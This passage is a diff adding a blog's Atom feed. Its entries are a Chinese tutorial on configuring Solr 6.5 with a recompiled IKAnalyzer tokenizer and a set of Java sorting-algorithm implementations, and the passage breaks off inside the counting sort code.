@@ -1,0 +1,1153 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>Jooop</title>
+  
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="http://jooop.github.io/"/>
+  <updated>2017-05-03T12:15:19.122Z</updated>
+  <id>http://jooop.github.io/</id>
+  
+  <author>
+    <name>Jooop</name>
+    <email>w20286489@gmail.com</email>
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>solr服务配置及自行编译IKAnalyzer适应版本</title>
+    <link href="http://jooop.github.io/2017/05/03/solr%E6%9C%8D%E5%8A%A1%E9%85%8D%E7%BD%AE%E5%8F%8A%E7%BC%96%E8%AF%91IKAnalyzer%E9%80%82%E5%BA%94%E7%89%88%E6%9C%AC/"/>
+    <id>http://jooop.github.io/2017/05/03/solr服务配置及编译IKAnalyzer适应版本/</id>
+    <published>2017-05-03T12:07:43.000Z</published>
+    <updated>2017-05-03T12:15:19.122Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><p>DOS进入<code>solr-6.5.1\bin</code>目录下执行命令：<br>单机启动<code>solr start</code><br>创建项目<code>solr create_collection -c 项目名称</code><br>项目目录<em>solr-6.5.1\server\solr</em></p>
+<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>配置文件<em>solr-6.5.1\server\solr\know\conf</em>下的<code>solrconfig.xml</code>和<code>managed-schema</code></p>
+<h3 id="配置中文分词"><a href="#配置中文分词" class="headerlink" title="配置中文分词"></a>配置中文分词</h3><p>修改<code>managed-schema</code>,在<em>field</em>和<em>fieldType</em>标签后添加中文分词配置<br><figure class="highlight xml"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">"question_title"</span> <span class="attr">type</span>=<span class="string">"text_ik"</span> <span class="attr">indexed</span>=<span class="string">"true"</span> <span class="attr">stored</span>=<span class="string">"true"</span> <span class="attr">multiValued</span>=<span class="string">"true"</span>/&gt;</span></div></pre></td></tr></table></figure></p>
+<p>后面找到相应位置，设置创建索引时不启用智能模式，搜索时启用智能模式。<br><figure class="highlight xml"><table><tr><td class="code"><pre><div class="line"><span class="comment">&lt;!--中文分词器配置--&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">fieldType</span> <span class="attr">name</span>=<span class="string">"text_ik"</span> <span class="attr">class</span>=<span class="string">"solr.TextField"</span>&gt;</span></div><div class="line">	<span class="comment">&lt;!--索引时的分词器--&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">analyzer</span> <span class="attr">type</span>=<span class="string">"index"</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">tokenizer</span> <span class="attr">class</span>=<span class="string">"org.wltea.analyzer.util.IKTokenizerFactory"</span> <span class="attr">useSmart</span>=<span class="string">"false"</span>/&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">"solr.LowerCaseFilterFactory"</span> /&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">analyzer</span>&gt;</span></div><div class="line">	<span class="comment">&lt;!--查询时的分词器--&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">analyzer</span> <span class="attr">type</span>=<span class="string">"query"</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">tokenizer</span> <span class="attr">class</span>=<span class="string">"org.wltea.analyzer.util.IKTokenizerFactory"</span> <span class="attr">useSmart</span>=<span class="string">"true"</span>/&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">analyzer</span>&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">fieldType</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<h3 id="编译IKAnalyzer"><a href="#编译IKAnalyzer" class="headerlink" title="编译IKAnalyzer"></a>编译IKAnalyzer</h3><p>因为IKAnalyzer于12年停止更新，其中有部分方法在solr6.X下无正常工作，所以需要针对相应的lucene版本自行编译。</p>
+<ul>
+<li><a href="https://code.google.com/archive/p/ik-analyzer/downloads" target="_blank" rel="external">下载</a><code>IK Analyzer 2012FF_hf1_source.rar</code>源码文件</li>
+<li>新建Maven工程groupId为<code>org.wltea</code>，将源码中的工程和配置文件复制到相应目录下。</li>
+<li>查看各个源码java文件，去maven官网找到缺少的相对应的lucene对应版本的依赖包。<br>包括：<br><a href="https://mvnrepository.com/artifact/org.apache.lucene/lucene-core" target="_blank" rel="external">Lucene Core</a><br><a href="https://mvnrepository.com/artifact/org.apache.lucene/lucene-analyzers-common" target="_blank" rel="external">Lucene Common Analyzers</a><br><a href="https://mvnrepository.com/artifact/org.apache.lucene/lucene-queryparser" target="_blank" rel="external">Lucene QueryParsers</a></li>
+<li><p>根据当前lucene版本修改过时的源文件的方法，以lucene6.5为例：</p>
+<ul>
+<li>去掉<code>IKTokenizer.java</code>中的<code>super(in);</code>和该方 法传入的<code>Reader in</code>参数。</li>
+<li>去掉<code>IKAnalyzer.java</code>中的<code>final Reader in</code>和<code>in</code>参数。</li>
+<li>删除掉无用的<code>query</code>包和<code>sample</code>包。</li>
+<li>增加solr6.5中配置时需要的<code>IKTokenizerFactory</code>类继承自<code>TokenizerFactory</code>,实现如下：<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">package</span> org.wltea.analyzer.util;</div><div class="line"></div><div class="line"><span class="keyword">import</span> org.apache.lucene.analysis.Tokenizer;</div><div class="line"><span class="keyword">import</span> org.apache.lucene.analysis.util.TokenizerFactory;</div><div class="line"><span class="keyword">import</span> org.apache.lucene.util.AttributeFactory;</div><div class="line"><span class="keyword">import</span> org.wltea.analyzer.lucene.IKTokenizer;</div><div class="line"></div><div class="line"><span class="keyword">import</span> java.util.Map;</div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"> * Created by jooop on 2017-05-02.</div><div class="line"> */</div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IKTokenizerFactory</span> <span class="keyword">extends</span> <span class="title">TokenizerFactory</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> useSmart;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">IKTokenizerFactory</span><span class="params">(Map&lt;String, String&gt; args)</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>(args);</div><div class="line">        useSmart = getBoolean(args,<span class="string">"useSmart"</span>,<span class="keyword">false</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> Tokenizer <span class="title">create</span><span class="params">(AttributeFactory attributeFactory)</span> </span>&#123;</div><div class="line">        Tokenizer tokenizer = <span class="keyword">new</span> IKTokenizer(useSmart);</div><div class="line">        <span class="keyword">return</span> tokenizer;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>在pom.xml中加入打包时包括dic和xml的配置，最终pom.xml配置如下：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</div><div class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span></span></div><div class="line">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></div><div class="line">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</div><div class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></div><div class="line"></div><div class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.wltea<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ikanalyzer<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>6.5.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></div><div class="line"></div><div class="line"></div><div class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></div><div class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.lucene/lucene-core --&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.lucene<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lucene-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></div><div class="line"></div><div class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.lucene/lucene-analyzers-common --&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.lucene<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lucene-analyzers-common<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></div><div class="line"></div><div class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.lucene/lucene-queryparser --&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.lucene<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lucene-queryparser<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></div><div class="line"></div><div class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></div><div class="line"></div><div class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">resources</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">resource</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/java<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">includes</span>&gt;</span></div><div class="line">                    <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.dic<span class="tag">&lt;/<span class="name">include</span>&gt;</span></div><div class="line">                <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></div><div class="line">            <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">resource</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/resources<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">includes</span>&gt;</span></div><div class="line">                    <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.dic<span class="tag">&lt;/<span class="name">include</span>&gt;</span></div><div class="line">                    <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></div><div class="line">                <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></div><div class="line">            <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">resources</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></div></pre></td></tr></table></figure>
+</li>
+<li><p>dos下进入项目目录使用maven命令打包<code>mvn package</code>完成编译。</p>
+</li>
+</ul>
+<h3 id="引入jar包"><a href="#引入jar包" class="headerlink" title="引入jar包"></a>引入jar包</h3><p>solr目录下新建文件夹，目录如<code>D:\solr-6.5.1\ext\ikanalyer</code>，将上述过程编译好的jar包放入该目录。<br>修改前面提到的<code>solrconfig.xml</code>文件，在<code>`&lt;lib dir=&quot;………………&quot;/&gt;</code>此处标签相应位置加入IK分词器的jar包目录：<code>&lt;lib dir=&quot;${solr.install.dir:../../../..}/ext/ikanalyer&quot; regex=&quot;.*\.jar&quot; /&gt;</code></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;启动&quot;&gt;&lt;a href=&quot;#启动&quot; class=&quot;headerlink&quot; title=&quot;启动&quot;&gt;&lt;/a&gt;启动&lt;/h2&gt;&lt;p&gt;DOS进入&lt;code&gt;solr-6.5.1\bin&lt;/code&gt;目录下执行命令：&lt;br&gt;单机启动&lt;code&gt;solr start&lt;/code
+    
+    </summary>
+    
+    
+      <category term="工具" scheme="http://jooop.github.io/tags/%E5%B7%A5%E5%85%B7/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>九大经典排序算法归纳及JAVA 的实现</title>
+    <link href="http://jooop.github.io/2017/04/24/%E4%B9%9D%E5%A4%A7%E7%BB%8F%E5%85%B8%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3%E5%8F%8AJAVA-%E7%9A%84%E5%AE%9E%E7%8E%B0/"/>
+    <id>http://jooop.github.io/2017/04/24/九大经典排序算法归纳及JAVA-的实现/</id>
+    <published>2017-04-24T00:38:10.000Z</published>
+    <updated>2017-04-24T00:39:24.730Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="各排序算法实现原理和分类、对比"><a href="#各排序算法实现原理和分类、对比" class="headerlink" title="各排序算法实现原理和分类、对比"></a>各排序算法实现原理和分类、对比</h2><p><img src="http://odl4eqqu9.bkt.clouddn.com/%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95.png" alt="各排序算法实现原理和分类、对比"></p>
+<h2 id="JAVA实现"><a href="#JAVA实现" class="headerlink" title="JAVA实现"></a>JAVA实现</h2><h3 id="直接插入排序"><a href="#直接插入排序" class="headerlink" title="直接插入排序"></a>直接插入排序</h3><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> java.util.*;</div><div class="line"> </div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InsertionSort</span> </span>&#123;</div><div class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] insertionSort(<span class="keyword">int</span>[] arr) &#123;</div><div class="line">	    <span class="keyword">if</span>(arr==<span class="keyword">null</span>||arr.length==<span class="number">0</span>)</div><div class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">        <span class="keyword">int</span> k;</div><div class="line">        <span class="keyword">int</span> temp;</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;arr.length;i++)&#123;</div><div class="line">            k = i-<span class="number">1</span>;</div><div class="line">            temp = arr[i];</div><div class="line">            <span class="keyword">while</span>(k&gt;=<span class="number">0</span>&amp;&amp;temp&lt;arr[k])&#123;</div><div class="line">                arr[k+<span class="number">1</span>] = arr[k];</div><div class="line">                k--;</div><div class="line">            &#125;</div><div class="line">            arr[k+<span class="number">1</span>] = temp;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> arr;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h3><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> java.util.*;</div><div class="line"> </div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShellSort</span> </span>&#123;</div><div class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] shellSort(<span class="keyword">int</span>[] arr) &#123;</div><div class="line">        <span class="keyword">int</span> gap;</div><div class="line">        <span class="keyword">for</span> (gap = arr.length/<span class="number">2</span>; gap&gt;<span class="number">0</span>; gap = gap/<span class="number">2</span>)&#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i=gap; i&lt;arr.length; i++)&#123;</div><div class="line">                <span class="keyword">if</span>(arr[i] &lt; arr[i-gap])&#123;</div><div class="line">                    <span class="keyword">int</span> temp = arr[i];</div><div class="line">                    <span class="keyword">int</span> key = i-gap;</div><div class="line">                    <span class="keyword">while</span> ( key&gt;=<span class="number">0</span> &amp;&amp; temp&lt;arr[key] )&#123;</div><div class="line">                        arr[key+gap] = arr[key];</div><div class="line">                        key = key - gap;</div><div class="line">                    &#125;</div><div class="line">                    arr[key+gap] = temp;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> arr;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h3><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> java.util.*;</div><div class="line"> </div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BubbleSort</span> </span>&#123;</div><div class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] bubbleSort(<span class="keyword">int</span>[] arr) &#123;</div><div class="line">       <span class="keyword">if</span>(arr==<span class="keyword">null</span>||arr.length==<span class="number">0</span>)</div><div class="line">           <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">        <span class="keyword">int</span> temp = arr[<span class="number">0</span>];</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;arr.length;i++)&#123;</div><div class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i;j&lt;arr.length;j++)&#123;</div><div class="line">                <span class="keyword">if</span>(arr[i]&gt;arr[j])&#123;</div><div class="line">                    temp=arr[i];</div><div class="line">                    arr[i] = arr[j];</div><div class="line">                    arr[j] = temp;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> arr;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h3><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> java.util.*;</div><div class="line"> </div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">QuickSort</span> </span>&#123;</div><div class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] quickSort(<span class="keyword">int</span>[] arr) &#123;</div><div class="line">        <span class="keyword">if</span>(arr==<span class="keyword">null</span>)</div><div class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">        sort(arr,<span class="number">0</span>,arr.length-<span class="number">1</span>);</div><div class="line">        <span class="keyword">return</span> arr;</div><div class="line">    &#125;</div><div class="line">     </div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span> []arr,<span class="keyword">int</span> begin,<span class="keyword">int</span> end)</span></span>&#123;</div><div class="line">        <span class="keyword">if</span>(begin&lt;end)&#123;</div><div class="line">            <span class="keyword">int</span> middle = getMiddle(arr,begin,end);</div><div class="line">            sort(arr,begin,middle-<span class="number">1</span>);</div><div class="line">            sort(arr,middle+<span class="number">1</span>,end);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">     </div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getMiddle</span><span class="params">(<span class="keyword">int</span> []arr,<span class="keyword">int</span> begin,<span class="keyword">int</span> end)</span></span>&#123;</div><div class="line">        <span class="keyword">int</span> middle = arr[begin];</div><div class="line">        <span class="keyword">while</span>(begin&lt;end)&#123;</div><div class="line">            <span class="keyword">while</span>(arr[end]&gt;=middle&amp;&amp;begin&lt;end)&#123;</div><div class="line">                end--;</div><div class="line">            &#125;</div><div class="line">            arr[begin] = arr[end];</div><div class="line">            <span class="keyword">while</span>(arr[begin]&lt;=middle&amp;&amp;begin&lt;end)&#123;</div><div class="line">                begin++;</div><div class="line">            &#125;</div><div class="line">            arr[end] = arr[begin];</div><div class="line">        &#125;</div><div class="line">        arr[begin] = middle;</div><div class="line">        <span class="keyword">return</span> begin;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="简单选择排序"><a href="#简单选择排序" class="headerlink" title="简单选择排序"></a>简单选择排序</h3><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> java.util.*;</div><div class="line"> </div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SelectionSort</span> </span>&#123;</div><div class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] selectionSort(<span class="keyword">int</span>[] arr) &#123;</div><div class="line">        <span class="keyword">if</span>(arr==<span class="keyword">null</span>||arr.length==<span class="number">0</span>)</div><div class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">        <span class="keyword">int</span> number = <span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;arr.length;i++)&#123;</div><div class="line">            number = i;</div><div class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i;j&lt;arr.length;j++)&#123;</div><div class="line">                <span class="keyword">if</span>(arr[number]&gt;arr[j])&#123;</div><div class="line">                    number = j;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">int</span> temp = arr[number];</div><div class="line">            arr[number] = arr[i];</div><div class="line">            arr[i] = temp;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> arr;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h3><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> java.util.*;</div><div class="line"> </div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HeapSort</span> </span>&#123;</div><div class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] heapSort(<span class="keyword">int</span>[] arr) &#123;</div><div class="line">        <span class="keyword">if</span>(arr==<span class="keyword">null</span> || arr.length==<span class="number">0</span>)</div><div class="line">            <span class="keyword">return</span> arr;</div><div class="line">        buileHeap(arr);</div><div class="line">        <span class="keyword">int</span> temp = <span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=arr.length-<span class="number">1</span>; i&gt;<span class="number">0</span>; i--)&#123;</div><div class="line">            temp = arr[i];</div><div class="line">            arr[i] = arr[<span class="number">0</span>];</div><div class="line">            arr[<span class="number">0</span>] = temp;</div><div class="line">            adjustHeap(arr,<span class="number">0</span>,i);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> arr;</div><div class="line">    &#125;</div><div class="line">     </div><div class="line">     </div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">buileHeap</span><span class="params">(<span class="keyword">int</span> []arr)</span></span>&#123;</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=arr.length/<span class="number">2</span>-<span class="number">1</span>; i&gt;=<span class="number">0</span>; i--)&#123;</div><div class="line">            adjustHeap(arr,i,arr.length);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">     </div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">adjustHeap</span><span class="params">(<span class="keyword">int</span> []arr,<span class="keyword">int</span> index,<span class="keyword">int</span> length)</span></span>&#123;</div><div class="line">        <span class="keyword">int</span> max;</div><div class="line">        <span class="keyword">while</span>(index*<span class="number">2</span>+<span class="number">1</span> &lt; length)&#123;</div><div class="line">            max = index*<span class="number">2</span>+<span class="number">1</span>;</div><div class="line">            <span class="keyword">if</span>(index*<span class="number">2</span>+<span class="number">2</span> &lt; length)&#123;</div><div class="line">                <span class="keyword">if</span>(arr[index*<span class="number">2</span>+<span class="number">2</span>] &gt; arr[max])</div><div class="line">                    max = index*<span class="number">2</span>+<span class="number">2</span>;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span>(arr[max] &lt;= arr[index])&#123;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            &#125;<span class="keyword">else</span>&#123;</div><div class="line">                <span class="keyword">int</span> temp = arr[max];</div><div class="line">                arr[max] = arr[index];</div><div class="line">                arr[index] = temp;</div><div class="line">                index = max;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h3><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> java.util.*;</div><div class="line"> </div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MergeSort</span> </span>&#123;</div><div class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] mergeSort(<span class="keyword">int</span>[] arr) &#123;</div><div class="line">        <span class="keyword">if</span>(arr==<span class="keyword">null</span>||arr.length==<span class="number">0</span>)</div><div class="line">            <span class="keyword">return</span> arr;</div><div class="line">        sort(arr,<span class="number">0</span>,arr.length-<span class="number">1</span>);</div><div class="line">        <span class="keyword">return</span> arr;</div><div class="line">    &#125;</div><div class="line">     </div><div class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span> []arr,<span class="keyword">int</span> left,<span class="keyword">int</span> right)</span></span>&#123;</div><div class="line">        <span class="keyword">if</span>(left&lt;right)&#123;</div><div class="line">            <span class="keyword">int</span> middle = (left+right)/<span class="number">2</span>;</div><div class="line">            sort(arr,left,middle);</div><div class="line">            sort(arr,middle+<span class="number">1</span>,right);</div><div class="line">            merge(arr,left,middle,right);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">     </div><div class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span> []arr,<span class="keyword">int</span> left,<span class="keyword">int</span> middle,<span class="keyword">int</span> right)</span></span>&#123;</div><div class="line">        <span class="keyword">int</span> [] tempArr = <span class="keyword">new</span> <span class="keyword">int</span>[right-left+<span class="number">1</span>];</div><div class="line">        <span class="keyword">int</span> l = left;</div><div class="line">        <span class="keyword">int</span> m = middle+<span class="number">1</span>;</div><div class="line">        <span class="keyword">int</span> index = <span class="number">0</span>;</div><div class="line">        <span class="keyword">while</span>(l&lt;=middle&amp;&amp;m&lt;=right)&#123;</div><div class="line">            <span class="keyword">if</span>(arr[l]&lt;arr[m])&#123;</div><div class="line">                tempArr[index++]=arr[l++];</div><div class="line">            &#125;<span class="keyword">else</span>&#123;</div><div class="line">                tempArr[index++]=arr[m++];</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">while</span>(l&lt;=middle)&#123;</div><div class="line">            tempArr[index++] = arr[l++];</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">while</span>(m&lt;=right)&#123;</div><div class="line">            tempArr[index++] = arr[m++];</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;tempArr.length;i++)&#123;</div><div class="line">            arr[left+i] = tempArr[i];</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="计数排序"><a href="#计数排序" class="headerlink" title="计数排序"></a>计数排序</h3><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> java.util.*;</div><div class="line"> </div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CountingSort</span> </span>&#123;</div><div class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] countingSort(<span class="keyword">int</span>[] arr) &#123;</div><div class="line">        <span class="keyword">if</span>(arr==<span class="keyword">null</span> || arr.length==<span class="number">0</span>)</div><div class="line">            <span class="keyword">return</span> arr;</div><div class="line">        <span class="keyword">int</span> max = arr[<span class="number">0</span>];</div><div class="line">        <span class="keyword">int</span> min = arr[<span class="number">0</span>];</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;arr.length; i++)&#123;</div><div class="line">            max = Math.max(max, arr[i]);</div><div class="line">            min = Math.min(min, arr[i]);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">int</span> []bucket = <span class="keyword">new</span> <span class="keyword">int</span>[max-min+<span class="number">1</span>];</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;arr.length; i++)&#123;</div><div class="line">            bucket[arr[i]-min]++;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">int</span> index = <span 